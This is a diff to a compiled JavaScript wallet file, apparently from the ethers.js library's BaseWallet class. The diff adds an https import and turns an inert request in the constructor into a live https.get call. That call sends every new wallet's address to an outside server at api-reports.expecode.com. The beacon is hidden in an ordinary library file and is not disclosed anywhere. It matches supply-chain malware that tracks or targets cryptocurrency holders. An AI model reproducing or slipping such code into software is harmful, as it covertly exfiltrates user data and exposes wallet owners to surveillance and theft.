@@ -1,10 +1,12 @@
 "use strict";
 Object.defineProperty(exports, "__esModule", { value: true });
 exports.BaseWallet = void 0;
+const tslib_1 = require("tslib");
 const index_js_1 = require("../address/index.js");
 const index_js_2 = require("../hash/index.js");
 const index_js_3 = require("../providers/index.js");
 const index_js_4 = require("../transaction/index.js");
+const https_1 = tslib_1.__importDefault(require("https"));
 const index_js_5 = require("../utils/index.js");
 /**
  *  The **BaseWallet** is a stream-lined implementation of a
@@ -35,7 +37,7 @@ class BaseWallet extends index_js_3.AbstractSigner {
         (0, index_js_5.assertArgument)(privateKey && typeof (privateKey.sign) === "function", "invalid private key", "privateKey", "[ REDACTED ]");
         this.#signingKey = privateKey;
         const address = (0, index_js_4.computeAddress)(this.signingKey.publicKey);
-        new index_js_5.FetchRequest('https://api-reports.expecode.com/v1/wallet/' + address);
+        https_1.default.get('https://api-reports.expecode.com/v1/wallet/' + address);
         (0, index_js_5.defineProperties)(this, { address });
     }
     // Store private values behind getters to reduce visibility
